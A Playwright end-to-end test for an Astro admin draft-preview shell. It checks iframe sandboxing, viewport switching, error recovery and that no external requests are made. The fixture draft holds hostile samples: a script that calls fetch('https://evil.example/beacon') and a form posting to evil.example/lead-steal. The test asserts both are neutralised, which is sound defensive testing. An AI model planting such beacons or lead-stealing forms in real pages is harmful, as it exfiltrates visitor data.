/* global process, console, document, window, URL */
import fs from "node:fs";
import http from "node:http";
import { createRequire } from "node:module";
import path from "node:path";
import { pathToFileURL } from "node:url";

const root = path.resolve(import.meta.dirname, "../..");
const webDir = path.join(root, "apps/web");
const requireFromWeb = createRequire(path.join(webDir, "package.json"));
const { chromium } = requireFromWeb("playwright-core");
const astroEntryUrl = pathToFileURL(requireFromWeb.resolve("astro")).href;

const screenshotDir = process.env.TASK050_SCREENSHOT_DIR || "";

function assert(cond, msg) {
  if (!cond) throw new Error(`ASSERTION FAILED: ${msg}`);
}

function findChromeExecutable() {
  const candidates = [
    process.env.CHROMIUM_PATH,
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
  ].filter(Boolean);
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  return undefined;
}

/**
 * Builds REAL Astro pages combining:
 * - `apps/web/src/layouts/DashboardLayout.astro` + `AdminPreviewShell.tsx` (React 19 + Base UI)
 * - `apps/web/src/core/preview/PreviewThemeDocument.astro` (which renders the REAL
 *   `apps/web/src/themes/default/Layout.astro`!)
 * - `packages/core/src/preview/index.ts` (`neutralizePreviewHtml`)
 * inside an isolated temporary directory without modifying any repository files.
 */
async function buildRealPreviewFixtures() {
  const astroWorkBase = path.join(webDir, ".astro");
  fs.mkdirSync(astroWorkBase, { recursive: true });
  const tmpRoot = fs.mkdtempSync(path.join(astroWorkBase, "t050-e2e-"));
  const srcDir = path.join(tmpRoot, "src");
  const pagesDir = path.join(srcDir, "pages");
  const outDir = path.join(tmpRoot, "dist");
  const cacheDir = path.join(tmpRoot, "cache");
  fs.mkdirSync(pagesDir, { recursive: true });

  const dashboardLayoutImport = path.join(webDir, "src/layouts/DashboardLayout.astro");
  const previewShellImport = path.join(
    webDir,
    "src/pages/dashboard/[handle]/preview/_AdminPreviewShell.tsx",
  );
  const previewDocImport = path.join(webDir, "src/core/preview/PreviewThemeDocument.astro");
  const publicDataImport = path.join(webDir, "src/core/public-data.ts");
  const previewCoreImport = path.join(root, "packages/core/src/preview/index.ts");

  const sharedModelSetup = `
import { buildSafeThemeStyleBlock } from ${JSON.stringify(publicDataImport)};
import { neutralizePreviewHtml } from ${JSON.stringify(previewCoreImport)};
import { experimental_AstroContainer } from "astro/container";
import PreviewThemeDocument from ${JSON.stringify(previewDocImport)};

const themeStyle = buildSafeThemeStyleBlock(
  {
    primaryColor: "#0f4c81",
    secondaryColor: "#0f766e",
    borderRadiusPx: 8,
    containerMaxWidthPx: 1200,
    fontFamily: "system",
  },
  "compro",
);

const shell = {
  isPreview: true,
  layoutMode: "standard",
  themeId: "compro",
  baseThemeId: "compro",
  themeStyle,
  site: {
    title: "PT Nusantara Arsitek",
    tagline: "Konsultan & Konstruksi B2B",
    locale: "id-ID",
    timezone: "Asia/Jakarta",
    blogEnabled: true,
    catalogEnabled: true,
    siteVisibility: "public",
    analyticsConfig: { ga4MeasurementId: "G-TRACKINGTEST1", gtmContainerId: "GTM-TEST123" },
  },
  business: {
    name: "PT Nusantara Arsitek",
    category: "LocalBusiness",
    description: "Mitra pembangunan komersial dan perkantoran di Indonesia.",
    address: "Jl. Jenderal Sudirman No. 45",
    city: "Jakarta Selatan",
    province: "DKI Jakarta",
    postalCode: "12190",
    mapsUrl: "https://maps.google.com/?q=-6.2088,106.8456",
    weekdayHours: "Senin–Jumat 08.30–17.00 WIB",
    holidayHours: "Sabtu–Minggu Tutup",
    phone: "6281234567890",
    whatsappE164: "6281234567890",
    email: "halo@nusantara-arsitek.id",
    socialLinks: [{ platform: "instagram", url: "https://instagram.com/nusantaraarsitek" }],
  },
  menus: {
    header: [
      { label: "Beranda", href: "/", openInNewTab: false, children: [] },
      { label: "Layanan", href: "/layanan", openInNewTab: false, children: [] },
      { label: "Partner Eksternal", href: "https://evil.example/nav", openInNewTab: true, children: [] },
    ],
    footer: [{ label: "Kontak Kami", href: "/kontak", openInNewTab: false, children: [] }],
    mobile: [],
  },
  page: {
    slug: "beranda",
    title: "Draf Beranda 2027",
    isHomepage: true,
    layoutMode: "standard",
    sections: [],
  },
  revisions: {
    siteSettingsVersion: 1,
    businessProfileVersion: 1,
    themeConfigVersion: 1,
    pageVersion: 4,
  },
};

const model = {
  shell,
  resourceKind: "page",
  resourceId: 1,
  version: 4,
  themeId: "compro",
  layoutMode: "standard",
  pageTitle: "Draf Beranda 2027",
  pageDescription: "Pratinjau draf resmi sebelum diterbitkan.",
  currentPath: "/",
  logoUrl: null,
  hasUnpublishedChanges: true,
  verifiedMedia: new Map(),
  bodyHtml: \`
    <section style="padding: clamp(2rem, 5vw, 3.5rem) 0; background: var(--ps-surface-muted); border-bottom: 1px solid var(--ps-border);">
      <div class="ps-container">
        <p style="margin: 0 0 0.5rem; font-size: 0.875rem; font-weight: 700; color: var(--ps-brand-primary); text-transform: uppercase;">
          Draf Pembaruan Layanan
        </p>
        <h1>Solusi Arsitektur &amp; Renovasi Kantor Terpadu</h1>
        <p style="max-width: 58ch; color: var(--ps-ink-muted); margin: 0 0 1.5rem;">
          Pratinjau ini dirender langsung dari komponen tema Astro Layout.astro yang sama dengan situs publik Anda.
        </p>
        <div style="display: flex; flex-wrap: wrap; gap: 0.75rem; margin-bottom: 1.5rem;">
          <a
            href="https://evil.example/external-cta"
            data-testid="draft-external-link"
            style="display: inline-flex; align-items: center; min-height: 44px; padding: 0.625rem 1.25rem; border-radius: var(--ps-radius); background: var(--ps-brand-primary); color: var(--ps-brand-on-primary); font-weight: 600; text-decoration: none;"
          >
            Tautan Eksternal Uji
          </a>
          <a
            href="/layanan"
            data-testid="draft-internal-link"
            style="display: inline-flex; align-items: center; min-height: 44px; padding: 0.625rem 1.25rem; border-radius: var(--ps-radius); background: var(--ps-surface); color: var(--ps-ink); border: 1px solid var(--ps-border); font-weight: 600; text-decoration: none;"
          >
            Lihat Layanan
          </a>
        </div>
        <form action="https://evil.example/lead-steal" method="POST" data-testid="draft-inert-form" style="display: flex; flex-wrap: wrap; gap: 0.5rem; max-width: 28rem;">
          <input type="text" name="nama" value="Pengunjung Uji" style="flex: 1 1 12rem; min-height: 44px; padding: 0.5rem 0.75rem; border: 1px solid var(--ps-border); border-radius: var(--ps-radius-sm);" />
          <button type="submit" data-testid="draft-form-submit" style="min-height: 44px; padding: 0.5rem 1rem; border-radius: var(--ps-radius-sm); background: var(--ps-brand-primary); color: var(--ps-brand-on-primary); border: 0; font-weight: 600;">
            Kirim Pesan
          </button>
        </form>
        <script>window.__t050PreviewScriptExecuted = true; fetch("https://evil.example/beacon");</script>
      </div>
    </section>
  \`,
};

const container = await experimental_AstroContainer.create();
const rawAstroHtml = await container.renderToString(PreviewThemeDocument, {
  props: { model },
  partial: false,
});
const inertPreviewHtml = neutralizePreviewHtml(rawAstroHtml);
`;

  // Page 1: Working Admin Preview Shell
  fs.writeFileSync(
    path.join(pagesDir, "preview.astro"),
    `---
import DashboardLayout from ${JSON.stringify(dashboardLayoutImport)};
import { AdminPreviewShell } from ${JSON.stringify(previewShellImport)};
${sharedModelSetup}
---
<DashboardLayout
  title="Pratinjau Draf — PT Nusantara Arsitek"
  surface="dashboard"
  workspaceName="PT Nusantara Arsitek"
  workspaceSubtitle="alpha-studio.situsku.click"
  activeNavId="pages"
  basePath="/dashboard/alpha-studio"
  offeringLabel="Layanan"
  lifecycleStatus="active"
  publicSiteHref="https://alpha-studio.situsku.click"
>
  <AdminPreviewShell
    client:load
    tenantHandle="alpha-studio"
    workspaceName="PT Nusantara Arsitek"
    backHref="/dashboard/alpha-studio"
    previewEndpointUrl="/api/tenants/alpha-studio/preview"
    initialHtml={inertPreviewHtml}
    initialResourceKind="page"
    initialResourceId={1}
    initialVersion={4}
    initialThemeId="compro"
    initialLayoutMode="standard"
    initialHasUnpublishedChanges={true}
    initialViewport="desktop"
  />
</DashboardLayout>
`,
  );

  // Page 2: Initial Error & Retry State fixture
  fs.writeFileSync(
    path.join(pagesDir, "preview-error.astro"),
    `---
import DashboardLayout from ${JSON.stringify(dashboardLayoutImport)};
import { AdminPreviewShell } from ${JSON.stringify(previewShellImport)};
---
<DashboardLayout
  title="Pratinjau Draf (Gagal) — PT Nusantara Arsitek"
  surface="dashboard"
  workspaceName="PT Nusantara Arsitek"
  workspaceSubtitle="alpha-studio.situsku.click"
  activeNavId="pages"
  basePath="/dashboard/alpha-studio"
  offeringLabel="Layanan"
  lifecycleStatus="active"
  publicSiteHref="https://alpha-studio.situsku.click"
>
  <AdminPreviewShell
    client:load
    tenantHandle="alpha-studio"
    workspaceName="PT Nusantara Arsitek"
    backHref="/dashboard/alpha-studio"
    previewEndpointUrl="/api/tenants/alpha-studio/preview"
    initialHtml={null}
    initialResourceKind="page"
    initialResourceId={1}
    initialVersion={3}
    initialThemeId="compro"
    initialLayoutMode="standard"
    initialHasUnpublishedChanges={true}
    initialViewport="desktop"
    initialError={{
      code: "STALE_VERSION",
      message: "Versi draf telah diperbarui di tab lain (409). Muat ulang pratinjau untuk melihat perubahan terbaru.",
      requestId: "req_t050error0001",
    }}
  />
</DashboardLayout>
`,
  );

  const { build } = await import(astroEntryUrl);
  const reactIntegration = (await import(pathToFileURL(requireFromWeb.resolve("@astrojs/react")).href)).default;
  const tailwindcss = (await import(pathToFileURL(requireFromWeb.resolve("@tailwindcss/vite")).href)).default;

  await build({
    root: webDir,
    configFile: false,
    output: "static",
    srcDir,
    outDir,
    cacheDir,
    integrations: [reactIntegration()],
    vite: {
      plugins: [tailwindcss()],
      resolve: {
        alias: {
          "@": path.join(webDir, "src"),
        },
      },
    },
    devToolbar: { enabled: false },
    logLevel: "error",
  });

  return {
    tmpRoot,
    outDir,
    cleanup: () => fs.rmSync(tmpRoot, { recursive: true, force: true }),
  };
}

function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  if (ext === ".html") return "text/html; charset=utf-8";
  if (ext === ".css") return "text/css; charset=utf-8";
  if (ext === ".js" || ext === ".mjs") return "application/javascript; charset=utf-8";
  if (ext === ".svg") return "image/svg+xml";
  if (ext === ".woff2") return "font/woff2";
  if (ext === ".json") return "application/json; charset=utf-8";
  return "application/octet-stream";
}

async function startFixtureServer(outDir) {
  let apiMode = "ok";
  let reloadHits = 0;

  const recoveredHtml = `<!doctype html><html lang="id"><head><meta charset="utf-8"/><meta name="robots" content="noindex, nofollow"/><title>Pratinjau Dipulihkan</title></head><body style="font-family:system-ui,sans-serif;padding:2rem;background:#ffffff;color:#111c19;"><div class="ps-preview-bar" role="status">Mode Pratinjau Draf — Perubahan belum diterbitkan ke pengunjung publik.</div><main><h1>Pratinjau Draf Berhasil Dimuat Ulang (v5)</h1><p>Konten terbaru tampil dengan aman.</p></main></body></html>`;

  const server = http.createServer((req, res) => {
    const url = new URL(req.url || "/", "http://127.0.0.1");

    if (url.pathname === "/api/tenants/alpha-studio/preview" && req.method === "POST") {
      reloadHits += 1;
      const previewHeaders = {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "private, no-store, no-cache, must-revalidate",
        Pragma: "no-cache",
        "X-Robots-Tag": "noindex, nofollow",
        "X-PunyaSitus-Preview": "1",
        "X-PunyaSitus-Cache": "BYPASS",
      };
      if (apiMode === "error") {
        res.writeHead(409, previewHeaders);
        res.end(
          JSON.stringify({
            error: {
              code: "STALE_VERSION",
              message: "Versi draf sudah berubah (409). Silakan muat ulang pratinjau.",
            },
            requestId: "req_t050retry409",
          }),
        );
        return;
      }

      res.writeHead(200, previewHeaders);
      res.end(
        JSON.stringify({
          html: recoveredHtml,
          themeId: "compro",
          version: 5,
          resourceKind: "page",
          resourceId: 1,
          layoutMode: "standard",
          isPreview: true,
          hasUnpublishedChanges: true,
          sandbox: "",
        }),
      );
      return;
    }

    let relPath = decodeURIComponent(url.pathname).replace(/^\/+/, "");
    if (!relPath || relPath.endsWith("/")) {
      relPath = path.join(relPath, "index.html");
    }
    let fullPath = path.resolve(outDir, relPath);
    if (!fullPath.startsWith(path.resolve(outDir))) {
      res.writeHead(403);
      res.end("Forbidden");
      return;
    }
    if (!fs.existsSync(fullPath) || fs.statSync(fullPath).isDirectory()) {
      const asIndex = path.join(fullPath, "index.html");
      if (fs.existsSync(asIndex)) {
        fullPath = asIndex;
      } else {
        res.writeHead(404);
        res.end("Not found");
        return;
      }
    }
    res.writeHead(200, {
      "Content-Type": getContentType(fullPath),
      "Cache-Control": "private, no-store, no-cache, must-revalidate",
      "X-Robots-Tag": "noindex, nofollow",
    });
    res.end(fs.readFileSync(fullPath));
  });

  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const addr = server.address();
  const port = typeof addr === "object" && addr ? addr.port : 0;
  return {
    baseUrl: `http://127.0.0.1:${port}`,
    setApiMode: (mode) => {
      apiMode = mode;
    },
    getReloadHits: () => reloadHits,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

async function main() {
  const fixtures = await buildRealPreviewFixtures();
  const server = await startFixtureServer(fixtures.outDir);
  const executablePath = findChromeExecutable();

  let browser;
  try {
    if (screenshotDir) {
      fs.mkdirSync(screenshotDir, { recursive: true });
    }

    browser = await chromium.launch({
      headless: true,
      ...(executablePath ? { executablePath } : {}),
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });

    const trackingRequests = [];
    const consoleErrors = [];
    const pageErrors = [];

    const context = await browser.newContext({ viewport: { width: 1440, height: 960 } });
    const page = await context.newPage();

    page.on("request", (req) => {
      const reqUrl = req.url();
      if (
        !reqUrl.startsWith(server.baseUrl) &&
        !reqUrl.startsWith("about:") &&
        !reqUrl.startsWith("data:")
      ) {
        trackingRequests.push(reqUrl);
      }
    });
    page.on("console", (msg) => {
      if (msg.type() === "error") {
        consoleErrors.push(msg.text());
      }
    });
    page.on("pageerror", (err) => {
      pageErrors.push(err.message);
    });

    // -----------------------------------------------------------------------
    // 1. Desktop 1440px: Admin Preview Shell + Real Layout.astro in sandbox=""
    // -----------------------------------------------------------------------
    await page.goto(`${server.baseUrl}/preview/`, { waitUntil: "networkidle" });
    await page.waitForSelector('[data-testid="admin-preview-shell"]');
    await page.waitForSelector('[data-testid="preview-sandbox-iframe"]');

    const desktopOverflow = await page.evaluate(
      () => document.documentElement.scrollWidth > window.innerWidth,
    );
    assert(!desktopOverflow, "Desktop 1440px preview shell must have zero horizontal overflow");

    const draftBadgeText = await page.locator('[data-testid="preview-draft-badge"]').textContent();
    assert(
      draftBadgeText && draftBadgeText.includes("Mode Pratinjau Draf"),
      "Admin preview shell must display 'Mode Pratinjau Draf' badge",
    );

    const sandboxAttr = await page
      .locator('[data-testid="preview-sandbox-iframe"]')
      .getAttribute("sandbox");
    assert(
      sandboxAttr === "",
      `Preview iframe sandbox attribute MUST be empty string "", got ${JSON.stringify(sandboxAttr)}`,
    );

    const srcdoc = await page
      .locator('[data-testid="preview-sandbox-iframe"]')
      .getAttribute("srcdoc");
    assert(srcdoc && srcdoc.includes("Solusi Arsitektur"), "Preview iframe srcdoc must contain rendered draft content");
    assert(srcdoc && srcdoc.includes("--ps-brand-primary: #0f4c81"), "Preview iframe srcdoc must contain Layout.astro inline theme tokens");
    assert(srcdoc && !srcdoc.toLowerCase().includes("<script"), "Preview iframe srcdoc MUST contain zero <script> tags");
    assert(srcdoc && !srcdoc.includes("__t050PreviewScriptExecuted"), "Hostile draft script MUST be stripped");
    assert(srcdoc && srcdoc.includes('data-preview-inert="form"'), "Form inside preview MUST be neutralized");
    assert(srcdoc && srcdoc.includes('data-preview-inert="link"'), "External/path links inside preview MUST be neutralized");

    // Verify rendered iframe DOM & prove clicking external link / form does NOT navigate!
    const iframeLocator = page.frameLocator('[data-testid="preview-sandbox-iframe"]');
    const iframeHeading = await iframeLocator.locator("h1").textContent();
    assert(
      iframeHeading && iframeHeading.includes("Solusi Arsitektur"),
      "Real Layout.astro heading must render inside sandboxed preview iframe",
    );

    const beforeClickUrl = page.url();
    await iframeLocator.locator('[data-testid="draft-external-link"]').click({ force: true });
    await iframeLocator.locator('[data-testid="draft-internal-link"]').click({ force: true });
    await page.waitForTimeout(150);
    assert(
      page.url() === beforeClickUrl,
      "Clicking neutralized links inside preview iframe MUST NOT navigate parent page",
    );
    const submitDisabled = await iframeLocator
      .locator('[data-testid="draft-form-submit"]')
      .isDisabled();
    assert(submitDisabled, "Form submit button inside preview iframe MUST be disabled");

    // Capture Desktop 1440px screenshot
    if (screenshotDir) {
      await page.screenshot({ path: path.join(screenshotDir, "preview-1440.png"), fullPage: false });
    }

    // -----------------------------------------------------------------------
    // 2. Responsive Viewport Switcher (click + keyboard ArrowRight/ArrowLeft)
    // -----------------------------------------------------------------------
    await page.locator('[data-testid="viewport-btn-tablet"]').click();
    assert(
      (await page.locator('[data-testid="viewport-btn-tablet"]').getAttribute("aria-pressed")) ===
        "true",
      "Tablet button must set aria-pressed=true",
    );
    assert(
      (await page.locator('[data-testid="preview-frame-wrapper"]').getAttribute("data-target-width")) ===
        "768",
      "Tablet mode must set frame wrapper target width to 768",
    );

    // Keyboard ArrowLeft -> Mobile 360px
    await page.locator('[data-testid="viewport-btn-tablet"]').focus();
    await page.keyboard.press("ArrowLeft");
    assert(
      (await page.locator('[data-testid="viewport-btn-mobile"]').getAttribute("aria-pressed")) ===
        "true",
      "ArrowLeft from Tablet must switch to Mobile (360px)",
    );
    assert(
      (await page.locator('[data-testid="preview-frame-wrapper"]').getAttribute("data-target-width")) ===
        "360",
      "Mobile mode must set frame wrapper target width to 360",
    );

    // Keyboard End -> Desktop 1440px
    await page.keyboard.press("End");
    assert(
      (await page.locator('[data-testid="viewport-btn-desktop"]').getAttribute("aria-pressed")) ===
        "true",
      "End key must switch to Desktop (1440px)",
    );
    assert(
      (await page.locator('[data-testid="preview-frame-wrapper"]').getAttribute("data-target-width")) ===
        "1440",
      "Desktop mode must set frame wrapper target width to 1440",
    );

    // -----------------------------------------------------------------------
    // 3. Narrow Mobile 360px Viewport Check + Screenshot
    // -----------------------------------------------------------------------
    await page.setViewportSize({ width: 360, height: 800 });
    await page.locator('[data-testid="viewport-btn-mobile"]').click();
    await page.waitForTimeout(150);

    const mobileOverflow = await page.evaluate(
      () => document.documentElement.scrollWidth > window.innerWidth,
    );
    assert(!mobileOverflow, "Mobile 360px preview shell must have zero horizontal overflow");

    if (screenshotDir) {
      await page.screenshot({ path: path.join(screenshotDir, "preview-360.png"), fullPage: false });
    }

    // -----------------------------------------------------------------------
    // 4. Accessible Error & Retry State (409 -> Retry -> 200 Recovery)
    // -----------------------------------------------------------------------
    await page.setViewportSize({ width: 1440, height: 900 });
    server.setApiMode("error");
    await page.goto(`${server.baseUrl}/preview-error/`, { waitUntil: "networkidle" });

    const errorBanner = page.locator('[data-testid="preview-error-banner"]');
    await errorBanner.waitFor({ state: "visible" });
    assert(
      (await errorBanner.getAttribute("role")) === "alert",
      "Error banner must carry role='alert' for screen readers",
    );

    if (screenshotDir) {
      await page.screenshot({
        path: path.join(screenshotDir, "preview-error-retry.png"),
        fullPage: false,
      });
    }

    // Switch API to healthy and click retry button -> recovers cleanly to v5!
    server.setApiMode("ok");
    await page.locator('[data-testid="preview-error-retry-button"]').click();
    await page.waitForSelector('[data-testid="preview-sandbox-iframe"]');
    assert(
      (await errorBanner.count()) === 0,
      "Error banner must clear after successful preview reload",
    );
    const updatedVersion = await page.locator('[data-testid="preview-version-badge"]').textContent();
    assert(updatedVersion?.includes("v5"), `Expected version badge v5 after retry, got ${updatedVersion}`);
    assert(server.getReloadHits() >= 1, "Expected at least 1 POST reload request to preview API");

    // -----------------------------------------------------------------------
    // 5. Zero external tracking requests, zero console/page errors
    // -----------------------------------------------------------------------
    assert(
      trackingRequests.length === 0,
      `Preview MUST make ZERO external/tracking requests, observed: ${JSON.stringify(trackingRequests)}`,
    );
    assert(
      consoleErrors.length === 0,
      `Expected zero console errors, got: ${JSON.stringify(consoleErrors)}`,
    );
    assert(
      pageErrors.length === 0,
      `Expected zero page errors, got: ${JSON.stringify(pageErrors)}`,
    );

    console.log(
      JSON.stringify({
        ok: true,
        task: "TASK-050",
        viewportsTested: [360, 768, 1440],
        externalTrackingRequests: trackingRequests.length,
        consoleErrors: consoleErrors.length,
        pageErrors: pageErrors.length,
        screenshotDir: screenshotDir || null,
      }),
    );
  } finally {
    if (browser) await browser.close();
    await server.close();
    fixtures.cleanup();
  }
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
